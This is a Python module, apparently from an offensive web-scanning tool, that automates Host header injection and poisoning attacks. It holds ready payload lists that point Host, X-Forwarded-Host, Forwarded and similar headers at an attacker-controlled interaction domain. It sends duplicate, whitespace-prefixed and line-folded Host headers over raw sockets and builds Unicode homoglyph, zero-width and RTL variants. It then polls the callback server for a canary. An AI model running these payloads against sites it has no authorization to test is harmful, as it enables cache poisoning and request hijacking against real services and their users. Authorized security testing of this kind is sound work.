#!/usr/bin/env python3
import sys
sys.dont_write_bytecode = True
from utils.style import Colors
from utils.utils import (
    requests,
    parse_headers,
    urllib3,
    re,
    traceback,
    get_domain_from_url,
    json
)
import socket
import ssl


def _raw_request(host, port, raw_data, use_ssl=False, timeout=10):
    """
    Send raw bytes via socket.
    Returns the raw response as string.
    """
    sock = socket.create_connection((host, port), timeout=timeout)
    if use_ssl:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(sock, server_hostname=host)
    try:
        sock.sendall(raw_data)
        chunks = []
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                chunks.append(chunk)
            except socket.timeout:
                break
        return b"".join(chunks).decode("utf-8", errors="replace")
    finally:
        sock.close()


def _send_double_host(original_host, port, use_ssl, path, method, body, headers, interactdom, canary_ua, timeout=10):
    """
    Double Host header + space-prefixed header smuggling via raw socket.
    No parser (h11, http.client, requests) allows duplicate Host or
    space-prefixed header names — raw bytes are the only way.
    """
    results = []

    double_host_cases = [
        # Double Host: legit first, evil second
        [("Host", original_host), ("Host", interactdom)],
        # Double Host: evil first, legit second
        [("Host", interactdom), ("Host", original_host)],
        # Double Host with leading space on second (smuggling-style)
        # Some proxies treat " Host" as continuation/different header
        [("Host", original_host), (" Host", interactdom)],
        # Leading tab on second Host (HRS-style)
        [("Host", original_host), ("\tHost", interactdom)],
        # Legit host + space-prefixed X-Forwarded-Host
        [("Host", original_host), (" X-Forwarded-Host", interactdom)],
        # Line folding (obs-fold) — deprecated but some servers still parse it
        # "Host: legit\r\n evil" → some parsers concatenate as "legit evil"
        [("Host", f"{original_host}\r\n {interactdom}")],
        [("Host", f"{original_host}\r\n\t{interactdom}")],
    ]

    for host_combo in double_host_cases:
        try:
            # Build raw HTTP request manually — no parser validation
            request_line = f"{method} {path} HTTP/1.1\r\n"

            # Inject the host combo headers first
            raw_headers = ""
            for hname, hval in host_combo:
                raw_headers += f"{hname}: {hval}\r\n"

            # Append remaining headers
            for k, v in headers.items():
                if k.lower() == "host":
                    continue
                if k.lower() == "user-agent":
                    raw_headers += f"{k}: {canary_ua}\r\n"
                else:
                    raw_headers += f"{k}: {v}\r\n"

            body_bytes = body.encode() if isinstance(body, str) else (body or b"")
            if body_bytes:
                raw_headers += f"Content-Length: {len(body_bytes)}\r\n"

            raw_req = (request_line + raw_headers + "\r\n").encode() + body_bytes
            raw_resp = _raw_request(original_host, port, raw_req, use_ssl=use_ssl, timeout=timeout)
            payload_desc = {h[0]: h[1] for h in host_combo}
            results.append((payload_desc, raw_resp))

        except Exception as e:
            payload_desc = {h[0]: h[1] for h in host_combo}
            print(f"  {Colors.RED}[!] double-host error ({payload_desc}): {e}{Colors.RESET}")

    return results


def _build_unicode_payloads(original_host, interactdom):
    """
    Build unicode-based Host header payloads.
    Targets normalization differentials between proxy and backend:
    - Unicode dots (NFKC normalizes to ASCII '.')
    - Zero-width chars (invisible, breaks string comparison)
    - Homoglyphs (visually identical, different codepoints)
    - Fullwidth header names (some parsers normalize to ASCII)
    - RTL/directional overrides (visual confusion + parser quirks)
    """
    # --- Unicode dots replacing '.' in domain ---
    UNICODE_DOTS = [
        ("\u3002", "ideographic-fullstop"),     # 。
        ("\uFF0E", "fullwidth-fullstop"),        # ．
        ("\u2027", "hyphenation-point"),          # ‧
        ("\u2024", "one-dot-leader"),             # ․
    ]

    # --- Zero-width / invisible chars ---
    ZWCHARS = [
        ("\u200B", "zw-space"),
        ("\u200C", "zw-non-joiner"),
        ("\u200D", "zw-joiner"),
        ("\uFEFF", "bom"),
        ("\u00AD", "soft-hyphen"),
        ("\u034F", "combining-grapheme-joiner"),
        ("\u2060", "word-joiner"),
    ]

    # --- Homoglyph replacements (latin -> lookalike) ---
    HOMOGLYPHS = [
        ("a", "\u0430", "cyrillic-a"),
        ("e", "\u0435", "cyrillic-e"),
        ("o", "\u043E", "cyrillic-o"),
        ("i", "\u0456", "cyrillic-i"),
        ("c", "\u0441", "cyrillic-c"),
        ("p", "\u0440", "cyrillic-r"),
        ("s", "\u0455", "cyrillic-s"),
        ("t", "\u0442", "cyrillic-t"),
    ]

    # --- Fullwidth "Host" header name variants ---
    UNICODE_HOST_NAMES = [
        ("\uFF28\uFF4F\uFF53\uFF54", "fullwidth-Host"),      # Ｈｏｓｔ
        ("H\u03BFst", "greek-omicron-Host"),                   # Hοst
        ("\u041Dost", "cyrillic-H-Host"),                      # Ноst
        ("Ho\u0455t", "cyrillic-s-Host"),                      # Hoѕt
        ("Hos\u0442", "cyrillic-t-Host"),                      # Hosт
    ]

    # --- RTL / directional override ---
    RTL_CHARS = [
        ("\u202E", "rtl-override"),
        ("\u202A", "ltr-embedding"),
        ("\u200F", "rtl-mark"),
    ]

    payloads = []
    interactdom_parts = interactdom.split(".")

    # 1. Unicode dots in interactdom: attacker<unicode_dot>com
    if len(interactdom_parts) >= 2:
        for udot, desc in UNICODE_DOTS:
            poisoned = udot.join(interactdom_parts)
            payloads.append(("Host", poisoned, f"udot-interact|{desc}"))

    # 2. Unicode dots between original_host and interactdom
    if len(interactdom_parts) >= 2:
        for udot, desc in UNICODE_DOTS:
            poisoned = f"{original_host}{udot}{interactdom}"
            payloads.append(("Host", poisoned, f"host+udot+interact|{desc}"))

    # 3. Zero-width chars injected in interactdom
    for zw, desc in ZWCHARS:
        # After first char
        poisoned = interactdom[0] + zw + interactdom[1:]
        payloads.append(("Host", poisoned, f"zw-inject|{desc}"))
        # Before dot separator
        poisoned2 = interactdom.replace(".", f"{zw}.", 1)
        payloads.append(("Host", poisoned2, f"zw-before-dot|{desc}"))

    # 4. Zero-width chars between original_host and interactdom
    for zw, desc in ZWCHARS:
        poisoned = f"{original_host}{zw}.{interactdom}"
        payloads.append(("Host", poisoned, f"zw-host-concat|{desc}"))

    # 5. Homoglyphs on original_host (bypass host check, backend normalizes -> routes to real app)
    for char_orig, char_repl, desc in HOMOGLYPHS:
        if char_orig in original_host:
            spoofed = original_host.replace(char_orig, char_repl, 1)
            payloads.append(("Host", spoofed, f"homoglyph-host|{desc}"))

    # 6. Homoglyphs on interactdom (some normalizers resolve to ASCII -> resolves to attacker)
    for char_orig, char_repl, desc in HOMOGLYPHS:
        if char_orig in interactdom:
            spoofed = interactdom.replace(char_orig, char_repl, 1)
            payloads.append(("Host", spoofed, f"homoglyph-interact|{desc}"))

    # 7. Unicode "Host" header names with interactdom as value
    for uhost_name, desc in UNICODE_HOST_NAMES:
        payloads.append((uhost_name, interactdom, f"unicode-header-name|{desc}"))

    # 8. RTL/directional prefix on interactdom
    for rtl, desc in RTL_CHARS:
        payloads.append(("Host", f"{rtl}{interactdom}", f"rtl-prefix|{desc}"))
        payloads.append(("Host", f"{original_host}{rtl}{interactdom}", f"rtl-concat|{desc}"))

    return payloads


def _send_unicode_payloads(original_host, port, use_ssl, path, method, body, headers, interactdom, canary_ua, unicode_payloads, timeout=10):
    """
    Send unicode Host payloads via raw socket.
    requests rejects non-ASCII in headers, so raw socket is mandatory.
    """
    results = []

    for header_name, header_value, desc in unicode_payloads:
        try:
            raw_headers = ""
            for k, v in headers.items():
                if k.lower() == "host":
                    continue
                if k.lower() == "user-agent":
                    raw_headers += f"{k}: {canary_ua}\r\n"
                else:
                    raw_headers += f"{k}: {v}\r\n"

            body_bytes = body.encode("utf-8") if isinstance(body, str) else (body or b"")
            if body_bytes:
                raw_headers += f"Content-Length: {len(body_bytes)}\r\n"

            request_line = f"{method} {path} HTTP/1.1\r\n"
            host_line = f"{header_name}: {header_value}\r\n"
            raw_req = (request_line + host_line + raw_headers + "\r\n").encode("utf-8") + body_bytes

            raw_resp = _raw_request(original_host, port, raw_req, use_ssl=use_ssl, timeout=timeout)
            payload_info = {f"{header_name}": header_value}
            results.append((payload_info, raw_resp))

        except Exception as e:
            print(f"  {Colors.RED}[!] unicode payload error ({desc}): {e}{Colors.RESET}")

    return results


def hhip(url, parsed_req, baseline, interact, proxy=None):
    """
    Host Header Injection Poisoning
    """
    print(f"{Colors.CYAN} ├ HHIP analysis{Colors.RESET}")
    interactdom = get_domain_from_url(interact)
    original_host = parsed_req["host"]
    method = parsed_req["method"]
    path = parsed_req["path"]
    body = parsed_req["body"]
    headers = dict(parsed_req["headers"])

    scheme = "https" if "https" in url else "http"
    use_ssl = scheme == "https"

    port = 443 if use_ssl else 80
    uri = f"{scheme}://{original_host}{path}"
    proxies = {"http": proxy, "https": proxy} if proxy else None

    CANARY = "toto123"
    canary_ua = None

    for h in headers:
        if h.lower() == "user-agent":
            canary_ua = f"{headers[h]}-{CANARY}"
            headers[h] = canary_ua
    if not canary_ua:
        canary_ua = f"Mozilla/5.0-{CANARY}"

    # --- Phase 1: Standard header injection payloads (via requests) ---
    print(f"{Colors.CYAN} └─ Standard header injection{Colors.RESET}")
    hhi_payloads = [
        {"Host": interactdom},
        {"Host": interact},
        {"Host": f"{interactdom}\\.{original_host}"},
        {"Host": f"{original_host}.{interactdom}"},
        {"Host": f"{interactdom}%00{original_host}"},
        {"Host": f"{interactdom}%09{original_host}"},
        {"Host": f"{original_host}@{interactdom}"},
        {"Host": f"{original_host}%23{interactdom}"},
        {"Host": f"{original_host}:{interactdom}"},
        {"Host": f"{original_host}#@{interactdom}"},
        {"Host": f"{interactdom}%.{original_host}"},
        {"X-Forwarded-For": interactdom},
        {"X-Forwarded-Host": interactdom},
        {"X-Client-IP": interactdom},
        {"X-Remote-IP": interactdom},
        {"X-Remote-Addr": interactdom},
        {"X-Host": interactdom},
        {"X-Original-URL": interact},
        {"Forwarded": f"host={interactdom}"},
    ]

    for hhi_p in hhi_payloads:
        header_inj = headers.copy()
        header_inj.update(hhi_p)
        try:
            resp_hhi = requests.request(
                method=method, url=uri, headers=header_inj,
                data=body or None, verify=False, allow_redirects=False,
                timeout=10, proxies=proxies,
            )
            _check_response(resp_hhi, interactdom, baseline, hhi_p, interact, CANARY, path)
        except requests.RequestException as e:
            print(f"  {Colors.RED}[!] request error: {e}{Colors.RESET}")

    # --- Phase 2: Double Host headers (raw socket) ---
    print(f"{Colors.CYAN} └─ Double Host headers{Colors.RESET}")
    dh_results = _send_double_host(
        original_host, port, use_ssl, path, method, body,
        headers, interactdom, canary_ua
    )
    for payload_desc, raw_resp in dh_results:
        _check_raw_response(raw_resp, interactdom, baseline, payload_desc, interact, CANARY, path)

    # --- Phase 3: Unicode Host injection (raw socket) ---
    print(f"{Colors.CYAN} └─ Unicode Host injection{Colors.RESET}")
    unicode_payloads = _build_unicode_payloads(original_host, interactdom)
    unicode_results = _send_unicode_payloads(
        original_host, port, use_ssl, path, method, body,
        headers, interactdom, canary_ua, unicode_payloads
    )
    for payload_info, raw_resp in unicode_results:
        _check_raw_response(raw_resp, interactdom, baseline, payload_info, interact, CANARY, path)


def _check_response(resp, interactdom, baseline, payload, interact, canary, path):
    """Check a requests.Response for HHI indicators."""
    if interactdom in resp.text:
        print(f"{Colors.GREEN}   └── [+] {interactdom} reflected in body | PAYLOAD: {payload}{Colors.RESET}")
    resp_headers_str = str(resp.headers)
    if interactdom in resp_headers_str:
        print(f"{Colors.GREEN}   └── [+] {interactdom} reflected in headers | PAYLOAD: {payload}{Colors.RESET}")
    if resp.status_code != baseline['status'] and resp.status_code != 400:
        print(f"{Colors.YELLOW}   └──  [STATUS ≠ BASELINE] {resp.status_code} ≠ {baseline['status']} | PAYLOAD: {payload}{Colors.RESET}")
    if resp.status_code == baseline['status'] and len(resp.content) != baseline['body_length']:
        print(f"{Colors.YELLOW}   └──  [LEN ≠ BASELINE] {len(resp.content)}b ≠ {baseline['body_length']}b | PAYLOAD: {payload}{Colors.RESET}")
    try:
        req_interact = requests.get(interact, verify=False, allow_redirects=False, timeout=10)
        if req_interact.status_code == 200:
            if canary in req_interact.text:
                print(f"{Colors.GREEN}   └── [+] canary '{canary}' caught on {interact} | PAYLOAD: {payload}{Colors.RESET}")
            if path in req_interact.text:
                print(f"{Colors.GREEN}   └── [+] path '{path}' caught on {interact} | PAYLOAD:  {payload}{Colors.RESET}")
    except requests.RequestException:
        pass


def _check_raw_response(raw_resp, interactdom, baseline, payload, interact, canary, path):
    """Check a raw socket response string for HHI indicators."""
    if interactdom in raw_resp:
        print(f"{Colors.GREEN}   └── [+] {interactdom} reflected in raw response | PAYLOAD: {payload}{Colors.RESET}")

    # Extract status code from raw response
    status_match = re.search(r"HTTP/[\d.]+ (\d{3})", raw_resp)
    if status_match:
        status_code = int(status_match.group(1))
        if status_code != baseline['status'] and status_code != 400:
            print(f"{Colors.YELLOW}   └── [STATUS ≠ BASELINE] {status_code} ≠ {baseline['status']} | PAYLOAD: {payload}{Colors.RESET}")

    # Poll interact server for callback
    try:
        req_interact = requests.get(interact, verify=False, allow_redirects=False, timeout=10)
        if req_interact.status_code == 200:
            if canary in req_interact.text:
                print(f"{Colors.GREEN}   └── [+] canary '{canary}' caught on {interact} | PAYLOAD: {payload}{Colors.RESET}")
            if path in req_interact.text:
                print(f"{Colors.GREEN}   └── [+] path '{path}' caught on {interact} | PAYLOAD: {payload}{Colors.RESET}")
    except requests.RequestException:
        pass